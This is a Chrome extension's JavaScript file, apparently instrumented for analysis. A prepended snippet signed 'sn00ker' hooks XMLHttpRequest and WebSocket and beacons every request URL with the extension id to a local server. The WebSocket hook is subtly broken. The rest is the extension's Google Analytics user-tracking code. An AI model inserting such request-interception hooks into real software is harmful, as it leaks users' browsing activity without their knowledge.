function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function(e) {
  "use strict";
  (function(e, t, a, n, r, o, c) {
    e["GoogleAnalyticsObject"] = r;
    e[r] = e[r] || function() {
      (e[r].q = e[r].q || []).push(arguments);
    }, e[r].l = 1 * new Date();
    o = t.createElement(a), c = t.getElementsByTagName(a)[0];
    o.async = 1;
    o.src = n;
    c.parentNode.insertBefore(o, c);
  })(e, document, "script", "https://www.google-analytics.com/analytics.js", "ga");
  var t = function() {
    var e = function() {
      return ((1 + Math.random()) * 65536 | 0).toString(16).substring(1);
    };
    return e() + e() + "-" + e() + "-" + e() + "-" + e() + "-" + e() + e() + e();
  };
  var a = localStorage.getItem("uid") || t();
  localStorage.setItem("uid", a);
  var n = localStorage.getItem("user_group") || Math.floor(Math.random() * 10) + 1;
  localStorage.setItem("user_group", n);
  var r = {
    userId: a,
    checkProtocolTask: function() {},
    campaignId: chrome.runtime.id,
    title: localStorage.getItem("dim1") || "New Tab"
  };
  ga("create", "UA-87134519-1", "auto");
  ga("set", r);
  ga("create", "UA-87134519-6", "auto", "trackInstall");
  ga("trackInstall.set", r);
  ga("create", "UA-87134519-7", "auto", "trackClick");
  ga("trackClick.set", r);
  ga("create", "UA-87134519-8", "auto", "trackSearch");
  ga("trackSearch.set", r);
  ga("create", "UA-87134519-13", "auto", "trackNoti");
  ga("trackNoti.set", r);
  ga("create", "UA-87134519-9", "auto", "trackError");
  ga("trackError.set", r);
  ga("create", "UA-91642342-" + n, "auto", "trackActive");
  ga("trackActive.set", r);
  if (location.pathname.indexOf("background") == -1) {
    var o = "/" + localStorage.getItem("ext_name") + location.pathname;
    if (e.debug) console.log("TRACK: ", "pageview", o); else ga("trackActive.send", "pageview", o);
  }
  e.ajax = function(e, t, a, n, r) {
    var o = new XMLHttpRequest();
    o.open(e, t);
    o.timeout = 5e3;
    o.onreadystatechange = function() {
      if (o.readyState == 4 && o.status == 200) {
        if (typeof n == "function") {
          n(o);
        }
      } else if (o.readyState == 4) {
        if (typeof r == "function") {
          r(o.status);
        }
      }
    };
    o.send(a);
  };
  e.ajax_get = function(e, t, a, n, r) {
    ajax("GET", e, t, function(e) {
      if (typeof n == "function") {
        if (a == "xml") {
          n(e.responseXML);
        } else if (a == "text") {
          n(e.responseText);
        } else {
          n(JSON.parse(e.responseText));
        }
      }
    }, r);
  };
  e.ajax_post = function(t, a, n, r, o) {
    ajax("POST", t, a, function(t) {
      if (typeof r == "function") {
        if (n == "xml") {
          r(t.responseXML);
        } else if (n == "text") {
          r(t.responseText);
        } else {
          r(JSON.parse(t.responseText));
          if (e.debug) console.log("JSON.parse(xhr.responseText)", JSON.parse(t.responseText));
        }
      }
    }, o);
  };
  e.ajax_head = function(e, t, a) {
    ajax("HEAD", e, null, function(e) {
      if (typeof t == "function") t(e);
    }, a);
  };
  e.trackStatusEvent = function(e, t, a, n) {
    var r = "";
    if (e.indexOf("search") == 0) {
      chrome.extension.sendMessage({
        search: e,
        query: a
      }, n);
      return;
    } else if (e.indexOf("error") == 0) {
      r = "trackError";
    }
    if (r) {
      ga(r + "." + "send", {
        hitType: "event",
        eventCategory: chrome.i18n.getMessage("extName"),
        eventAction: e,
        eventLabel: a == null || typeof a == "string" ? a : JSON.stringify(a)
      });
    }
  };
})(this);